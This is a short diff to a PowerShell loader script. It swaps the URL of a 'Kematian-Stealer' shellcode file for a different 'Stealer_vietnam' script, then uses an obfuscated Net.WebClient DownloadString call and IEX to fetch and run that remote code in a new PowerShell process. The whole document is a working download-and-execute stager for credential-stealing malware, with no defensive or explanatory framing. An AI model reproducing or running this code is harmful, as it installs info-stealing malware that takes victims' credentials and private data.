@@ -1,4 +1,4 @@
-$skibiditoilet = ("https://github.com/adasdasdsaf/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+$skibiditoilet = ("https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1")
 $dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"
 Start-Process "powershell" -Argument "IEX($dopdopyesyes)" -NoNewWindow -PassThru
 
